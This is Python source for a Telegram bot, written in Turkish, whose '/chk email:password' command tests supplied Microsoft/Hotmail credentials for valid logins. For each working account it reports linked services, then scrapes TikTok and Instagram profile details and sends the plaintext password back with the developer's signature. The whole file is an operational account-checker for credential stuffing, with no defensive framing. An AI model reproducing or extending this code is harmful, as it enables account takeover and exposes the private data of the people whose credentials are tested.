# /CHK KOMUTU - Hızlı Hesap Kontrolü
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['chk'])
def chk_command(message):
    """Hızlı kontrol komutu: /chk email:şifre"""
    user_id = message.from_user.id
    
    if is_banned(user_id):
        return
    
    try:
        text = message.text.replace('/chk', '').strip()
        
        if not text or ':' not in text:
            bot.reply_to(message, 
                "📝 Kullanım: <code>/chk email:şifre</code>\n\n"
                "Örnek:\n"
                "<code>/chk ornek@hotmail.com:Sifre123</code>",
                parse_mode='HTML')
            return
        
        email, password = text.split(':', 1)
        
        start_time = time.time()
        
        result = HotmailChecker.check_account(email, password)
        
        if result["status"] != "HIT":
            elapsed = time.time() - start_time
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            
            fail_msg = f"""❌ <b>Microsoft Hesabı</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Şifre:</b> {password}
📊 <b>Durum:</b> GEÇERSİZ
📝 <b>Sonuç:</b> Hatalı Kimlik Bilgileri

⚡ <b>Süre:</b> {elapsed:.1f}s
👤 <b>Yapan:</b> {MY_SIGNATURE}
🌐 <b>Web:</b> {CHANNEL}
🕐 {current_time}"""
            
            bot.reply_to(message, fail_msg, parse_mode='HTML')
            return
        
        token = result.get("token")
        cid = result.get("cid")
        
        services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
        
        elapsed = time.time() - start_time
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        
        success_msg = f"""✅ <b>Microsoft Hesabı</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Şifre:</b> {password}
📊 <b>Durum:</b> HİT
📝 <b>Sonuç:</b> Giriş Başarılı

📱 <b>Bağlı Servisler ({len(services) if services else 0}):</b>
{chr(10).join(f'• {s}' for s in services) if services else '❌ Yok'}

⚡ <b>Süre:</b> {elapsed:.1f}s
👤 <b>Yapan:</b> {MY_SIGNATURE}
🌐 <b>Web:</b> {CHANNEL}
🕐 {current_time}"""
        
        bot.reply_to(message, success_msg, parse_mode='HTML')
        
        if services and "TikTok" in services:
            tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)
            
            if tk_result and tk_result.get('has_tiktok'):
                tk_username = tk_result.get('username', 'Bilinmiyor')
                tk_followers = tk_result.get('followers', 0)
                tk_following = tk_result.get('following', 0)
                tk_likes = tk_result.get('likes', 0)
                tk_videos = tk_result.get('videos', 0)
                tk_verified = tk_result.get('verified', False)
                
                tiktok_msg = f"""╔══════════════════════════════╗
║     ✅ TIKTOK HİT BULUNDU    ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Şifre:</b> {password}
📧 <b>TikTok E-posta:</b> {tk_result.get('tiktok_emails', 0)}

🎵 <b>TIKTOK PROFİL</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Kullanıcı Adı:</b> @{tk_username}
📛 <b>İsim:</b> {tk_username}
🆔 <b>ID:</b> {tk_result.get('user_id', 'Bilinmiyor')}

📊 <b>İSTATİSTİK</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Takipçi:</b> {format_number(tk_followers)} ({tk_followers:,})
➕ <b>Takip:</b> {format_number(tk_following)} ({tk_following:,})
❤️ <b>Beğeni:</b> {format_number(tk_likes)} ({tk_likes:,})
📹 <b>Video:</b> {tk_videos}

📝 <b>Bio:</b> {tk_result.get('bio', '')}

🔰 <b>Durum:</b> {'✅ Doğrulandı' if tk_verified else '❌ Doğrulanmadı'}
🔒 <b>Gizli:</b> Hayır
🌍 <b>Ülke:</b> Bilinmiyor 🏳️
📅 <b>Oluşturuldu:</b> Bilinmiyor

👤 <b>Tam Ad:</b> {tk_username}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Geliştirici:</b> {MY_SIGNATURE}
<b>Web:</b> {CHANNEL}
<b>Saat:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                
                bot.send_message(user_id, tiktok_msg, parse_mode='HTML')
        
        if services and "Instagram" in services:
            ig_username = email.split('@')[0]
            ig_info = get_instagram_full_info(ig_username)
            
            if ig_info:
                flag = get_country_flag(ig_info['country'])
                
                instagram_msg = f"""╔══════════════════════════════╗
║   📸 INSTAGRAM HİT BULUNDU   ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Şifre:</b> {password}

📸 <b>INSTAGRAM PROFİL</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Kullanıcı Adı:</b> @{ig_info['username']}
📛 <b>Tam Ad:</b> {ig_info['full_name']}
🆔 <b>Kullanıcı ID:</b> {ig_info['user_id']}

📊 <b>İSTATİSTİK</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Takipçi:</b> {ig_info['followers']:,}
➕ <b>Takip:</b> {ig_info['following']:,}
📸 <b>Gönderi:</b> {ig_info['posts']}

📝 <b>Bio:</b> {ig_info['bio']}

📅 <b>Katılım:</b> {ig_info['join_date']}
🌍 <b>Ülke:</b> {ig_info['country']} {flag}

🔰 <b>Durum:</b> {'✅ Doğrulandı' if ig_info['is_verified'] else '❌ Doğrulanmadı'}
🔒 <b>Gizli:</b> {'Evet' if ig_info['is_private'] else 'Hayır'}
💼 <b>İşletme:</b> {'Evet' if ig_info['is_business'] else 'Hayır'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Geliştirici:</b> {MY_SIGNATURE}
<b>Web:</b> {CHANNEL}
<b>Saat:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                
                bot.send_message(user_id, instagram_msg, parse_mode='HTML')
                
                if ig_info['profile_pic'] != 'Bilinmiyor':
                    try:
                        bot.send_photo(user_id, ig_info['profile_pic'])
                    except:
                        pass
        
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")
